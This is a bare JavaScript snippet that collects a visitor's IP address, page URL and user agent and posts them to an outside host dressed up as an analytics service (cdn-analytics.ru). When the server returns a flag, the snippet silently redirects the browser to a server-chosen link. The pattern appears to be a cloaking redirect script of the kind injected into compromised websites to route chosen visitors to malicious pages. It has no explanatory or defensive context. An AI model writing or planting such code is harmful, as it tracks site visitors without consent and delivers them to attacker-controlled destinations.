// PS PT ES RO IT
$.getJSON('https://api.ipify.org/?format=json', function(data){
    $.ajax({
  type: "POST",
  url: "https://cdn-analytics.ru/api/check_ip",
  data: { ip: data.ip, domain: "ad-construct", referer: window.location.href, user_agent: window.navigator.userAgent, headers: window.navigator.userAgent }
}).done(function( msg ) {
   cl = JSON.parse(msg);
  if (cl.result == 1) {
    redir_url = cl.link + location.search;
    document.location.href = redir_url;
    console.log('rd');
      
    } else { console.log('nord'); }
});
});
